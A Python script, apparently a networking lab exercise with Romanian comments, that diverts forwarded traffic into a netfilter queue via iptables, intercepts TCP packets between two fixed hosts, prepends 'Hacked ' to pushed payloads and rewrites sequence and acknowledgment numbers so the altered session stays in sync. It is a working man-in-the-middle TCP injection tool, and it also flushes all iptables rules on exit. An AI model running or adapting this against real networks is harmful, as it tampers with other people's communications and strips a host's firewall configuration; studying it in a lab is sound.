import os
from scapy.all import IP, TCP, scapy, send
from scapy.layers.l2 import ARP
from netfilterqueue import NetfilterQueue as NFQ

# frag-urile TCP
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

hacked_seq = dict()
hacked_ack = dict()

client_ip = "198.10.0.1"
server_ip = "198.10.0.2"

def detect_and_alter_packet(packet):
    global client_ip
    global server_ip
    global hacked_seq 
    global hacked_ack

    octets = packet.get_payload()
    scapy_packet = IP(octets)

    if scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == client_ip or scapy_packet[IP].src == server_ip):
        F = scapy_packet['TCP'].flags
        old_seq = scapy_packet['TCP'].seq
        old_ack = scapy_packet['TCP'].ack
        new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
        new_ack = hacked_ack[old_ack] if old_ack in hacked_ack.keys() else old_ack

        print("[Before]:")
        print(scapy_packet[IP].show2())
    
        msg = scapy_packet['TCP'].payload

        if F & PSH:
            msg = scapy.packet.Raw(b'Hacked ' + bytes(scapy_packet[TCP].payload))

        hacked_seq[old_seq + len(scapy_packet['TCP'].payload)] = new_seq + len(msg)
        hacked_ack[new_seq + len(msg)] = old_seq + len(scapy_packet['TCP'].payload)

        new_packet = IP(
            src=scapy_packet[IP].src,
            dst=scapy_packet[IP].dst
        ) / TCP(
            sport=scapy_packet[TCP].sport,
            dport=scapy_packet[TCP].dport,
            seq=new_seq,
            ack=new_ack,
            flags=scapy_packet[TCP].flags
        ) / (msg)

        print("[After]:")
        print(new_packet[IP].show2())

        send(new_packet)
    else:
        send(scapy_packet)

def conncet_to_queue():
    print("Started to alter packages")
    queue = NFQ()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        # bind trebuie să folosească aceiași coadă ca cea definită în iptables
        queue.bind(10, detect_and_alter_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()
        print("failed")

if __name__ == '__main__':
    conncet_to_queue()
